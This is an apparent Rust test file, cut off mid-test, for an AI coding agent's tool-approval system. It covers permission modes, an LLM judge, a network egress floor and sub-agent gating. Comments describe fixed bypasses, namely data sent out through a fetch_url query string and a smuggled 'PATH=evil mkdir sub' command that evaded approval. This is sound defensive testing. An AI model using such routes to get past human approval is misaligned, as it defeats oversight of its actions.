use std::pin::Pin;
use std::sync::{Arc, Mutex};

use async_stream::try_stream;
use futures_core::Stream;

use super::*;
use crate::client::AgentEventStream;
use crate::error::{AgentError, AgentResult};
use crate::event::AgentEvent;
use crate::model::{ChatRequest, FunctionCallDelta, ToolCallDelta, Usage};
use crate::model_registry::{DEEPSEEK_FLASH, DEEPSEEK_V4_PRO};
use crate::runtime::diagnostics::append_diagnostics;
use crate::session_store::SessionStore;
use crate::tool::{MockEchoTool, Tool, ToolError, ToolRegistry, ToolResultStatus};

#[test]
fn append_diagnostics_joins_blocks() {
    assert_eq!(
        append_diagnostics(
            "{\"path\":\"a.rs\"}",
            "<diagnostics file=\"a.rs\">\n</diagnostics>"
        ),
        "{\"path\":\"a.rs\"}\n\n<diagnostics file=\"a.rs\">\n</diagnostics>"
    );
}

/// Scripted client: replays a pre-recorded sequence of provider events for
/// each successive call to `stream_chat`.
struct ScriptedClient {
    scripts: Mutex<Vec<Vec<AgentEvent>>>,
}

impl ScriptedClient {
    fn new(scripts: Vec<Vec<AgentEvent>>) -> Self {
        Self {
            scripts: Mutex::new(scripts),
        }
    }
}

#[async_trait::async_trait]
impl LlmClient for ScriptedClient {
    fn provider_name(&self) -> &'static str {
        "scripted"
    }

    fn model(&self) -> &str {
        "scripted-model"
    }

    async fn stream_chat(&self, _request: ChatRequest) -> AgentResult<AgentEventStream> {
        let events = {
            let mut scripts = self.scripts.lock().unwrap();
            if scripts.is_empty() {
                Vec::new()
            } else {
                scripts.remove(0)
            }
        };

        let stream = try_stream! {
            for event in events {
                yield event;
            }
        };
        let stream: Pin<Box<dyn Stream<Item = AgentResult<AgentEvent>> + Send>> = Box::pin(stream);
        Ok(stream)
    }
}

fn tool_call_delta(id: &str, name: &str, arguments: &str) -> ToolCallDelta {
    indexed_tool_call_delta(0, id, name, arguments)
}

fn indexed_tool_call_delta(index: u32, id: &str, name: &str, arguments: &str) -> ToolCallDelta {
    ToolCallDelta {
        index: Some(index),
        id: Some(id.to_string()),
        call_type: Some("function".to_string()),
        function: Some(FunctionCallDelta {
            name: Some(name.to_string()),
            arguments: Some(arguments.to_string()),
        }),
    }
}

/// Auto-approved echo tool: borrows the exact whitelisted read-only name
/// `read_file` (the policy classifies by exact tool name), and the spec
/// itself does not require approval. The fake registry in these tests never
/// registers the real workspace tools, so the name cannot collide.
#[derive(Debug, Clone, Copy)]
struct AutoEchoTool;

impl AutoEchoTool {
    const NAME: &'static str = "read_file";
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
struct AutoEchoParams {
    message: Option<String>,
}

#[async_trait::async_trait]
impl Tool for AutoEchoTool {
    type Params = AutoEchoParams;

    fn name(&self) -> &str {
        Self::NAME
    }

    fn description(&self) -> &str {
        "Echoes a message without approval."
    }

    async fn run(
        &self,
        params: AutoEchoParams,
        _cx: &crate::tool::ToolCx,
    ) -> Result<crate::tool::ToolOutput, ToolError> {
        let message = params.message.unwrap_or_default();
        Ok(crate::tool::ToolOutput::text(format!(
            "read_file: {message}"
        )))
    }
}

fn registry_with_auto_and_mock() -> ToolRegistry {
    let mut registry = ToolRegistry::with_mock_tools();
    registry.register(AutoEchoTool);
    registry
}

/// A tool that always returns an error result, for exercising the cascade
/// struggle signal (repeated tool-call execution failures).
#[derive(Debug, Clone, Copy)]
struct FailingTool;

impl FailingTool {
    const NAME: &'static str = "fail_probe";
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
struct FailingParams {}

#[async_trait::async_trait]
impl Tool for FailingTool {
    type Params = FailingParams;

    fn name(&self) -> &str {
        Self::NAME
    }

    fn description(&self) -> &str {
        "Always fails."
    }

    async fn run(
        &self,
        _params: FailingParams,
        _cx: &crate::tool::ToolCx,
    ) -> Result<crate::tool::ToolOutput, ToolError> {
        Ok(crate::tool::ToolOutput::soft_error("boom"))
    }
}

/// A tool that reports out-of-band spend (the sub-agent shape). Borrows the
/// whitelisted read-only name so the call runs without approval (same trick
/// as `AutoEchoTool`, which is not registered alongside it).
#[derive(Debug, Clone, Copy)]
struct SpendReportingTool;

impl SpendReportingTool {
    const NAME: &'static str = "read_file";
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
struct SpendParams {}

#[async_trait::async_trait]
impl Tool for SpendReportingTool {
    type Params = SpendParams;

    fn name(&self) -> &str {
        Self::NAME
    }

    fn description(&self) -> &str {
        "Reports out-of-band spend."
    }

    async fn run(
        &self,
        _params: SpendParams,
        cx: &crate::tool::ToolCx,
    ) -> Result<crate::tool::ToolOutput, ToolError> {
        cx.report_spend(crate::tool::ToolSpend {
            cost: crate::pricing::CostEstimate { usd: 0.5, cny: 3.5 },
            cache_hit_tokens: 300,
            cache_miss_tokens: 100,
            cache_savings: crate::pricing::CostEstimate { usd: 0.2, cny: 1.4 },
        });
        Ok(crate::tool::ToolOutput::text("spent"))
    }
}

/// A tool that signals it has started and then parks on the cancel token (the
/// long-running foreground-command shape). Borrows the whitelisted read-only
/// name so the call runs without approval (same trick as `SpendReportingTool`).
#[derive(Debug)]
struct ParkUntilCancelledTool {
    started: Arc<tokio::sync::Notify>,
}

impl ParkUntilCancelledTool {
    const NAME: &'static str = "read_file";
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
struct ParkParams {}

#[async_trait::async_trait]
impl Tool for ParkUntilCancelledTool {
    type Params = ParkParams;

    fn name(&self) -> &str {
        Self::NAME
    }

    fn description(&self) -> &str {
        "Parks until cancelled."
    }

    async fn run(
        &self,
        _params: ParkParams,
        cx: &crate::tool::ToolCx,
    ) -> Result<crate::tool::ToolOutput, ToolError> {
        self.started.notify_one();
        cx.cancel_token().cancelled().await;
        Ok(crate::tool::ToolOutput::text("cancelled"))
    }
}

/// A stand-in registered under the real `shell` name so the execution policy
/// classifies and gates it exactly like shell — without spawning anything. It
/// echoes whether the sandbox grant carried network, so tests can assert the
/// end-to-end plumbing (declaration → gate → approval → sandbox policy).
#[derive(Debug, Clone, Copy)]
struct FakeShellTool;

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
struct FakeShellParams {
    command: String,
    #[allow(dead_code)] // consumed by the execution policy from raw arguments
    network: Option<bool>,
}

#[async_trait::async_trait]
impl Tool for FakeShellTool {
    type Params = FakeShellParams;

    fn name(&self) -> &str {
        "shell"
    }

    fn description(&self) -> &str {
        "Fake shell."
    }

    async fn run(
        &self,
        params: FakeShellParams,
        cx: &crate::tool::ToolCx,
    ) -> Result<crate::tool::ToolOutput, ToolError> {
        Ok(crate::tool::ToolOutput::text(format!(
            "ran `{}` net={}",
            params.command,
            cx.sandbox_policy().has_network_access()
        )))
    }
}

fn started_ids(events: &[RuntimeEvent]) -> Vec<String> {
    events
        .iter()
        .filter_map(|event| match event {
            RuntimeEvent::ToolCallStarted { tool_call_id, .. } => {
                Some(tool_call_id.as_str().to_string())
            }
            _ => None,
        })
        .collect()
}

fn finished_ids(events: &[RuntimeEvent]) -> Vec<String> {
    events
        .iter()
        .filter_map(|event| match event {
            RuntimeEvent::ToolCallFinished { tool_call_id, .. } => {
                Some(tool_call_id.as_str().to_string())
            }
            _ => None,
        })
        .collect()
}

async fn drain(rx: &mut RuntimeEventReceiver) -> Vec<RuntimeEvent> {
    let mut out = Vec::new();
    while let Some(event) = rx.recv().await {
        out.push(event);
    }
    out
}

#[tokio::test]
async fn one_provider_delta_maps_to_exactly_one_runtime_event() {
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::TextDelta {
            text: "hel".to_string(),
        },
        AgentEvent::TextDelta {
            text: "lo".to_string(),
        },
        AgentEvent::ReasoningDelta {
            text: "think".to_string(),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::new(client, ToolRegistry::default());

    let mut rx = runtime.submit_user("hi").await;
    let events = drain(&mut rx).await;

    let assistant_deltas = events
        .iter()
        .filter(|event| matches!(event, RuntimeEvent::AssistantDelta { .. }))
        .count();
    let reasoning_deltas = events
        .iter()
        .filter(|event| matches!(event, RuntimeEvent::ReasoningDelta { .. }))
        .count();
    assert_eq!(assistant_deltas, 2, "no duplicate assistant delta events");
    assert_eq!(reasoning_deltas, 1, "no duplicate reasoning delta events");
}

#[tokio::test]
async fn approve_path_feeds_tool_result_into_next_turn() {
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "thanks".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools());

    let mut rx = runtime.submit_user("please echo").await;
    let first = drain(&mut rx).await;
    assert!(matches!(
        first.last(),
        Some(RuntimeEvent::ApprovalRequired { .. })
    ));

    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    let second = drain(&mut rx).await;

    let mut saw_tool_result = false;
    let mut saw_finish = false;
    for event in &second {
        match event {
            RuntimeEvent::ToolCallFinished { result, .. } => {
                assert_eq!(result.status, ToolResultStatus::Success);
                assert_eq!(result.content, "mock_echo: hi");
                saw_tool_result = true;
            }
            RuntimeEvent::TurnFinished { .. } => saw_finish = true,
            _ => {}
        }
    }
    assert!(saw_tool_result, "expected ToolResult event after approval");
    assert!(saw_finish, "expected TurnFinished after second turn");

    let messages = runtime.session_messages().await;
    // Expect: user, assistant(tool_calls), tool, assistant("thanks").
    assert_eq!(messages.len(), 4);
    assert_eq!(messages[1].tool_calls.len(), 1);
    assert_eq!(messages[1].tool_calls[0].id, "call_1");
    assert_eq!(messages[2].role, crate::message::Role::Tool);
    assert_eq!(messages[2].tool_call_id.as_deref(), Some("call_1"));
    assert_eq!(messages[3].content, "thanks");
}

/// A turn's step budget counts the whole turn, and an approval park is inside
/// the turn.
///
/// These counters used to be locals of `run_loop`, and a park returns from that
/// loop while `resume_after_batch` re-enters it: every human answer restarted
/// the count at zero, so `[budget] turn_steps` was really "steps between two
/// approvals" and a model that asks for one gated tool per round never hit the
/// cap at all.
#[tokio::test]
async fn an_approval_park_does_not_refill_the_turns_step_budget() {
    const CAP: u32 = 3;
    let requests = Arc::new(Mutex::new(Vec::new()));
    let scripts: Vec<Vec<AgentEvent>> = (0..8)
        .map(|_| {
            vec![
                AgentEvent::ToolCallDelta {
                    delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
                },
                AgentEvent::Done { usage: None },
            ]
        })
        .collect();
    let client = CapturingClient {
        scripts: Mutex::new(scripts),
        requests: Arc::clone(&requests),
    };
    let mut config = crate::config::AgentConfig::builtin();
    config.turn_steps = CAP;
    let runtime = AgentRuntime::with_config(client, ToolRegistry::with_mock_tools(), config);

    let mut rx = runtime.submit_user("echo forever").await;
    let mut events = drain(&mut rx).await;
    // Answer every park the way a user would. The turn has to end on the cap,
    // not on a script running out.
    for _ in 0..8 {
        if !matches!(events.last(), Some(RuntimeEvent::ApprovalRequired { .. })) {
            break;
        }
        let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
        events = drain(&mut rx).await;
    }

    assert_eq!(
        requests.lock().unwrap().len(),
        CAP as usize,
        "the cap counts model requests for the whole turn, approvals included"
    );
    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::Error { .. })),
        "the turn has to end on the step limit: {events:?}"
    );
}

#[tokio::test]
async fn yolo_mode_auto_approves_gated_tool_without_parking() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools())
        .with_permission_mode(SharedPermissionMode::new(PermissionMode::Yolo));

    // A single drive: Yolo auto-approves the gated call and the turn runs to
    // completion without ever parking on approval.
    let mut rx = runtime.submit_user("please echo").await;
    let events = drain(&mut rx).await;

    assert!(
        events
            .iter()
            .all(|event| !matches!(event, RuntimeEvent::ApprovalRequired { .. })),
        "yolo must not park on approval"
    );
    assert!(events.iter().any(|event| matches!(
        event,
        RuntimeEvent::ToolCallFinished { result, .. } if result.content == "mock_echo: hi"
    )));
    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::TurnFinished { .. }))
    );
}

#[tokio::test]
async fn default_mode_still_parks_gated_tool() {
    // Same gated call, but Default mode (the runtime's default) parks it.
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::ToolCallDelta {
            delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools());
    let mut rx = runtime.submit_user("please echo").await;
    let events = drain(&mut rx).await;
    assert!(matches!(
        events.last(),
        Some(RuntimeEvent::ApprovalRequired { .. })
    ));
}

#[tokio::test]
async fn auto_mode_runs_when_classifier_approves() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};
    // Script serves one response per stream_chat call: (1) the turn emits the
    // gated call, (2) the classifier's judge call approves, (3) the turn
    // continues to completion.
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: r#"{"approve": true, "reason": "safe mock"}"#.to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools())
        .with_permission_mode(SharedPermissionMode::new(PermissionMode::Auto));

    let mut rx = runtime.submit_user("please echo").await;
    let events = drain(&mut rx).await;

    assert!(
        events
            .iter()
            .all(|event| !matches!(event, RuntimeEvent::ApprovalRequired { .. })),
        "classifier approved → no parking"
    );
    assert!(events.iter().any(|event| matches!(
        event,
        RuntimeEvent::ToolCallFinished { result, .. } if result.content == "mock_echo: hi"
    )));
}

#[tokio::test]
async fn auto_mode_asks_when_classifier_denies() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};
    // (1) gated call, (2) judge denies → the batch parks on approval.
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: r#"{"approve": false, "reason": "unclear"}"#.to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools())
        .with_permission_mode(SharedPermissionMode::new(PermissionMode::Auto));

    let mut rx = runtime.submit_user("please echo").await;
    let events = drain(&mut rx).await;
    assert!(
        matches!(events.last(), Some(RuntimeEvent::ApprovalRequired { .. })),
        "classifier denied → ask the human"
    );
}

/// A client whose first call issues a gated tool call and whose second — the
/// Auto judge — hangs until the test cancels the turn.
struct HangingJudgeClient {
    first: Mutex<Option<Vec<AgentEvent>>>,
    judge_started: Arc<tokio::sync::Notify>,
}

#[async_trait::async_trait]
impl LlmClient for HangingJudgeClient {
    fn provider_name(&self) -> &'static str {
        "hanging-judge"
    }

    fn model(&self) -> &str {
        "hanging-judge"
    }

    async fn stream_chat(&self, _request: ChatRequest) -> AgentResult<AgentEventStream> {
        if let Some(events) = self.first.lock().unwrap().take() {
            let stream = try_stream! {
                for event in events {
                    yield event;
                }
            };
            return Ok(Box::pin(stream));
        }
        self.judge_started.notify_one();
        let stream = try_stream! {
            std::future::pending::<()>().await;
            yield AgentEvent::Done { usage: None };
        };
        Ok(Box::pin(stream))
    }
}

/// Cancelling while the Auto judge is mid-flight ends the turn instead of
/// parking it. The batch loop checks the token only at call boundaries and the
/// judge aborts into "ask" on cancel, so without the re-check right before the
/// park site the call was parked with an already-cancelled token: nobody got a
/// `TurnCancelled`, the turn stayed live, and any answer to the prompt could
/// only finish it as cancelled.
#[tokio::test]
async fn cancel_during_the_judge_finishes_the_turn_instead_of_parking() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};
    let judge_started = Arc::new(tokio::sync::Notify::new());
    let client = HangingJudgeClient {
        first: Mutex::new(Some(vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", MockEchoTool::NAME, r#"{"message":"hi"}"#),
            },
            AgentEvent::Done { usage: None },
        ])),
        judge_started: Arc::clone(&judge_started),
    };
    let runtime = AgentRuntime::new(client, ToolRegistry::with_mock_tools())
        .with_permission_mode(SharedPermissionMode::new(PermissionMode::Auto));

    let mut rx = runtime.submit_user("please echo").await;
    judge_started.notified().await;
    let _ = runtime.cancel_turn().await;
    let events = drain(&mut rx).await;
    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::TurnCancelled { .. })),
        "the turn's own channel must carry the cancellation"
    );
    assert!(
        events
            .iter()
            .all(|event| !matches!(event, RuntimeEvent::ApprovalRequired { .. })),
        "a cancelled turn must not park a prompt"
    );
    assert!(
        runtime.live_turn_id().await.is_none(),
        "the turn must be over, not parked"
    );
}

/// A mock network tool that borrows the exact name `fetch_url` (the policy
/// classifies by name). Registered so an Auto-mode call can dispatch; if the
/// egress floor holds, it parks and this body never runs.
#[derive(Debug, Clone, Copy)]
struct NetworkMockTool;

impl NetworkMockTool {
    const NAME: &'static str = "fetch_url";
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
struct NetworkMockParams {
    #[allow(dead_code)]
    url: Option<String>,
}

#[async_trait::async_trait]
impl Tool for NetworkMockTool {
    type Params = NetworkMockParams;

    fn name(&self) -> &str {
        Self::NAME
    }

    fn description(&self) -> &str {
        "Mock network tool."
    }

    async fn run(
        &self,
        _params: NetworkMockParams,
        _cx: &crate::tool::ToolCx,
    ) -> Result<crate::tool::ToolOutput, ToolError> {
        Ok(crate::tool::ToolOutput::text("fetched"))
    }
}

/// The auto-mode egress floor covers the network-native tools (`fetch_url`/
/// `web_search`), not just calls carrying a declared `network: true`. The judge
/// is scripted to APPROVE, so the only way this parks is the floor firing
/// *before* the judge — the bug where `fetch_url` was decided by the classifier
/// in Auto mode and could exfiltrate over a GET query string.
#[tokio::test]
async fn auto_mode_floors_network_tools_above_the_judge() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta(
                    "call_1",
                    NetworkMockTool::NAME,
                    r#"{"url":"http://example.com/"}"#,
                ),
            },
            AgentEvent::Done { usage: None },
        ],
        // A judge verdict that WOULD approve — it must go unused because the
        // floor parks the call before any judge request is made.
        vec![
            AgentEvent::TextDelta {
                text: r#"{"approve": true, "reason": "looks fine"}"#.to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let mut registry = ToolRegistry::with_mock_tools();
    registry.register(NetworkMockTool);
    let runtime = AgentRuntime::new(client, registry)
        .with_permission_mode(SharedPermissionMode::new(PermissionMode::Auto));

    let mut rx = runtime.submit_user("fetch it").await;
    let events = drain(&mut rx).await;
    assert!(
        matches!(events.last(), Some(RuntimeEvent::ApprovalRequired { .. })),
        "a network-native tool must be floored to the human in Auto mode, even with an approving judge"
    );
    assert!(
        events.iter().all(|event| !matches!(
            event,
            RuntimeEvent::ToolCallFinished { result, .. } if result.content == "fetched"
        )),
        "the network tool must not have run"
    );
}

/// Mode monotonicity: Auto sits above AcceptEdits in the cycle, so it must
/// auto-approve everything AcceptEdits does. A bounded fs-edit (`mkdir sub`)
/// defaults to the High risk tier, which Auto's judge floor would otherwise
/// park on — but the AcceptEdits inheritance short-circuits before the judge,
/// so the call runs without ever emitting an approval prompt. The script has
/// NO judge response, proving the judge was never consulted.
#[tokio::test]
async fn auto_mode_inherits_accept_edits_fs_grant_without_asking() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};
    let workspace = tempfile::tempdir().unwrap();
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: tool_call_delta("call_1", "shell", r#"{"command": "mkdir sub"}"#),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "done".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let registry = crate::shell_tools::ShellTools::new(workspace.path())
        .unwrap()
        .with_sandbox(crate::sandbox::SandboxManager::new().force_sandbox(Some(false)))
        .into_registry();
    let runtime = AgentRuntime::with_new_session(
        client,
        registry,
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap()
    .with_permission_mode(SharedPermissionMode::new(PermissionMode::Auto));

    let mut rx = runtime.submit_user("make a dir").await;
    let events = drain(&mut rx).await;
    assert!(
        events
            .iter()
            .all(|event| !matches!(event, RuntimeEvent::ApprovalRequired { .. })),
        "Auto must inherit AcceptEdits's bounded fs-edit grant, not park on it"
    );
    assert!(
        events
            .iter()
            .any(|event| matches!(event, RuntimeEvent::ToolCallFinished { .. })),
        "the mkdir should have run to completion"
    );
    assert!(workspace.path().join("sub").is_dir(), "mkdir actually ran");
}

/// The AcceptEdits allowance covers a bounded fs-edit only when the program
/// word comes first on the line. `PATH=evil mkdir sub` runs ./evil/mkdir —
/// whatever the model put there with its auto-approved write tools — so it must
/// park on a prompt like any other untrusted command, in AcceptEdits and, by
/// inheritance, in Auto. Before the prefix rule, `program_of` skipped the
/// assignment, saw a bounded `mkdir`, and this ran with no prompt at all.
#[tokio::test]
async fn accept_edits_does_not_cover_an_env_prefixed_fs_edit() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};
    let workspace = tempfile::tempdir().unwrap();
    let client = ScriptedClient::new(vec![vec![
        AgentEvent::ToolCallDelta {
            delta: tool_call_delta("call_1", "shell", r#"{"command": "PATH=evil mkdir sub"}"#),
        },
        AgentEvent::Done { usage: None },
    ]]);
    let registry = crate::shell_tools::ShellTools::new(workspace.path())
        .unwrap()
        .with_sandbox(crate::sandbox::SandboxManager::new().force_sandbox(Some(false)))
        .into_registry();
    let runtime = AgentRuntime::with_new_session(
        client,
        registry,
        "system",
        workspace.path(),
        &crate::config::AgentConfig::builtin(),
    )
    .unwrap()
    .with_permission_mode(SharedPermissionMode::new(PermissionMode::AcceptEdits));

    let mut rx = runtime.submit_user("make a dir").await;
    let events = drain(&mut rx).await;
    assert!(
        matches!(events.last(), Some(RuntimeEvent::ApprovalRequired { .. })),
        "an env-prefixed edit must park on a prompt, not ride the fs-edit grant"
    );
    assert!(
        !workspace.path().join("sub").exists(),
        "nothing may run before the human answers"
    );
}

/// A parallel-safe tool (name `agent` → `ToolKind::SubAgent`) that blocks on a
/// shared size-2 barrier: `run` only returns once two calls are in flight at
/// once. Sequential batch execution deadlocks on it; concurrent execution
/// passes.
#[derive(Clone)]
struct BarrierAgentTool {
    barrier: Arc<tokio::sync::Barrier>,
    ran: Arc<std::sync::atomic::AtomicUsize>,
}

#[derive(Debug, serde::Deserialize, schemars::JsonSchema)]
struct BarrierParams {}

#[async_trait::async_trait]
impl Tool for BarrierAgentTool {
    type Params = BarrierParams;

    fn name(&self) -> &str {
        "agent"
    }

    fn description(&self) -> &str {
        "Barrier-synchronized stand-in for the agent tool."
    }

    async fn run(
        &self,
        _params: BarrierParams,
        _cx: &crate::tool::ToolCx,
    ) -> Result<crate::tool::ToolOutput, ToolError> {
        self.ran.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        self.barrier.wait().await;
        Ok(crate::tool::ToolOutput::text("done"))
    }
}

#[tokio::test]
async fn batch_runs_parallel_safe_agent_calls_concurrently() {
    let client = ScriptedClient::new(vec![
        vec![
            AgentEvent::ToolCallDelta {
                delta: indexed_tool_call_delta(0, "call_1", "agent", "{}"),
            },
            AgentEvent::ToolCallDelta {
                delta: indexed_tool_call_delta(1, "call_2", "agent", "{}"),
            },
            AgentEvent::Done { usage: None },
        ],
        vec![
            AgentEvent::TextDelta {
                text: "synthesized".to_string(),
            },
            AgentEvent::Done { usage: None },
        ],
    ]);
    let ran = Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let mut registry = ToolRegistry::new();
    registry.register(BarrierAgentTool {
        barrier: Arc::new(tokio::sync::Barrier::new(2)),
        ran: Arc::clone(&ran),
    });
    let runtime = AgentRuntime::new(client, registry);

    let mut rx = runtime.submit_user("fan out").await;
    // A serial batch would wedge here: the first call blocks on the size-2
    // barrier forever and the second never starts. Only concurrent execution
    // drains within the timeout.
    let events = tokio::time::timeout(std::time::Duration::from_secs(5), drain(&mut rx))
        .await
        .expect("same-batch agent calls must run concurrently, not serially");

    assert_eq!(
        ran.load(std::sync::atomic::Ordering::SeqCst),
        2,
        "both agent calls must execute"
    );
    assert_eq!(
        finished_ids(&events),
        vec!["call_1".to_string(), "call_2".to_string()],
        "results are recorded in issue order regardless of completion order"
    );
}

/// A run of `agent` calls executes concurrently only while the policy lets each
/// dispatch run outright. A gated dispatch — here a writing role, whose spawn
/// is the write authorization — must reach the approval gate exactly as it
/// would alone: waved through by AcceptEdits, parked for a human under
/// Default. The concurrent path cannot park, so before the group looked at the
/// plan it turned every gated dispatch in a run of two or more into an error,
/// in every mode, while the same call issued alone ran or prompted normally.
#[tokio::test]
async fn gated_agent_dispatches_leave_the_parallel_group_and_face_the_gate() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};
    use std::sync::atomic::Ordering::SeqCst;
    let implementer = r#"{"role":"implementer","task":"land it"}"#;
    let scripted = || {
        ScriptedClient::new(vec![
            vec![
                AgentEvent::ToolCallDelta {
                    delta: indexed_tool_call_delta(0, "call_1", "agent", implementer),
                },
                AgentEvent::ToolCallDelta {
                    delta: indexed_tool_call_delta(1, "call_2", "agent", implementer),
                },
                AgentEvent::Done { usage: None },
            ],
            vec![
                AgentEvent::TextDelta {
                    text: "synthesized".to_string(),
                },
                AgentEvent::Done { usage: None },
            ],
        ])
    };
    let build = |mode: PermissionMode| {
        let ran = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let mut registry = ToolRegistry::new();
        // A size-1 barrier never blocks: on the serial path these calls run
        // one at a time, so a size-2 barrier would be a deadlock, not a test.
        registry.register(BarrierAgentTool {
            barrier: Arc::new(tokio::sync::Barrier::new(1)),
            ran: Arc::clone(&ran),
        });
        let runtime = AgentRuntime::new(scripted(), registry)
            .with_permission_mode(SharedPermissionMode::new(mode));
        (runtime, ran)
    };
    let parked_ids = |events: &[RuntimeEvent]| -> Vec<String> {
        events
            .iter()
            .filter_map(|event| match event {
                RuntimeEvent::ApprovalRequired { request, .. } => Some(request.call_id.clone()),
                _ => None,
            })
            .collect()
    };

    // AcceptEdits: spawning a writing child is the standing write consent that
    // mode already grants per write, so both dispatches run, in issue order,
    // and nobody is asked.
    let (runtime, ran) = build(PermissionMode::AcceptEdits);
    let mut rx = runtime.submit_user("fan out").await;
    let events = drain(&mut rx).await;
    assert_eq!(ran.load(SeqCst), 2, "both writing dispatches must execute");
    assert_eq!(
        finished_ids(&events),
        vec!["call_1".to_string(), "call_2".to_string()]
    );
    assert!(
        parked_ids(&events).is_empty(),
        "AcceptEdits must not prompt"
    );
    for event in &events {
        if let RuntimeEvent::ToolCallFinished { result, .. } = event {
            assert_eq!(
                result.status,
                ToolResultStatus::Success,
                "a gated dispatch must not degrade into an error: {}",
                result.content
            );
        }
    }

    // Default: the first dispatch parks for a human and nothing runs unasked.
    // Approving it runs that one and parks the second; approving again drains
    // the batch — the serial gate handles the run exactly as it handles one.
    let (runtime, ran) = build(PermissionMode::Default);
    let mut rx = runtime.submit_user("fan out").await;
    let events = drain(&mut rx).await;
    assert_eq!(
        ran.load(SeqCst),
        0,
        "nothing may run before the human answers"
    );
    assert!(finished_ids(&events).is_empty());
    assert_eq!(parked_ids(&events), vec!["call_1".to_string()]);

    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    let events = drain(&mut rx).await;
    assert_eq!(ran.load(SeqCst), 1);
    assert_eq!(finished_ids(&events), vec!["call_1".to_string()]);
    assert_eq!(parked_ids(&events), vec!["call_2".to_string()]);

    let mut rx = runtime.submit_approval(ApprovalDecision::Approved).await;
    let events = drain(&mut rx).await;
    assert_eq!(ran.load(SeqCst), 2);
    assert_eq!(finished_ids(&events), vec!["call_2".to_string()]);
    assert!(parked_ids(&events).is_empty());
}

/// "Approve for the session" on a sub-agent dispatch is a one-time approve,
/// never a standing consent. A dispatch prompt authorizes what its arguments
/// say — here a writing role — and a remembered `agent` would have covered the
/// *other* kind too: a later `network: true` dispatch, which is its own
/// approval point (README, the `SubAgent` arm), ran with no prompt because the
/// by-name consent is consulted above the Auto egress floor and above the
/// mode. Both the networked dispatch and a second writing dispatch must park
/// exactly as they would with no history.
#[tokio::test]
async fn session_consent_on_an_agent_dispatch_does_not_cover_later_dispatches() {
    use crate::execution_policy::{PermissionMode, SharedPermissionMode};
    use std::sync::atomic::Ordering::SeqCst;
    let implementer = r#"{"role":"implementer","task":"land it"}"#;
    let networked = r#"{"role":"explore","network":true,"task":"look it up"}"#;
    let text_turn = |text: &str| {
        vec![
            AgentEvent::TextDelta {
                text: text.to_string(),
            },
            AgentEvent::Done { usage: None },
        ]
    };
    let dispatch_turn = |id: &str, arguments: &str| {
        vec![
            AgentEvent::ToolCallDelta {
                delta: indexed_tool_call_delta(0, id, "agent", arguments),
            },
            AgentEvent::Done { usage: None },
        ]
    };
    let client = ScriptedClient::new(vec![
